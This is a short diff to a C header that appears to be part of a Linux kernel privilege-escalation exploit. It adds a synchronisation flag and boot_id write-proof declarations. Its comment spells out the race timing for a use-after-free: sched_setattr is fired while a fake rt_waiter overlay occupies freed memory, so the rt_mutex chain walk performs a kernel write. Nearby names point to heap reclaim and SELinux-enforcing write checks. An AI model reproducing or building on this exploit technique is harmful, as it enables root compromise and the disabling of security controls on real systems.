@@ -251,6 +251,13 @@ extern atomic_int route_done;
 extern atomic_int waiter_tid;
 extern atomic_int punch_consume_go;
 extern atomic_int punch_consume_stop;
+/* Set by the waiter as the LAST statement before the pselect() syscall and
+ * cleared right after it returns. The consumer MUST wait for this before firing
+ * sched_setattr: the chain walk has to run while the fake-waiter overlay
+ * occupies the freed rt_waiter. Fired earlier it walks the RESIDUAL waiter
+ * (tree_entry RB_CLEARed by remove_waiter) and rt_mutex_dequeue early-returns
+ * => survives, writes nothing. */
+extern atomic_int pselect_armed;
 extern atomic_int consumer_calls;
 extern atomic_int consumer_success;
 extern atomic_int main_route_delay_usec;
@@ -408,6 +415,9 @@ int open_memfd(pid_t child);
 void kill_child(pid_t child);
 void close_reclaim_sockets(void);
 int scratch_write_diag_enabled(void);
+int bootid_write_proof_enabled(void);
+extern int bootid_proof_active;
+extern char bootid_proof_before[64];
 int enforcing_write_diag_enabled(void);
 void scratch_diag_readback(uint64_t expect);
 void setup_kernelsnitch(void);
